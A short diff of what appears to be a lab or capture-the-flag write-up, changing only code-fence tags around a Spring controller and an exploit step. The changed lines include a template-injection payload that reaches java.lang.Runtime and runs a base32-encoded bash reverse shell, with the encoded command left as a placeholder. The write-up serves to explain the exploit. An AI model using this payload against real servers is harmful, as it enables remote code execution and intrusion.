@@ -175,7 +175,7 @@ if (!approvedClass.contains(osc.getName())) {
     }
 ```
 **MainController.java**
-```java!
+```java
 @PostMapping(value = "/test")
 *     @ResponseBody
     public String test(@RequestParam("name") String name) throws IOException {
@@ -204,7 +204,7 @@ if (!approvedClass.contains(osc.getName())) {
 ```
 Use `mvn install` to compile into file jar and then run docker again.
 And then use this payload to revshell:
-```!
+```java
 $date.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("bash -c {echo,BASE_32_PAYLOAD_REVSHELL}|{base32,-d}|{bash,-i}").getInputStream()
 ```
 ![image](img/hihi1.png)
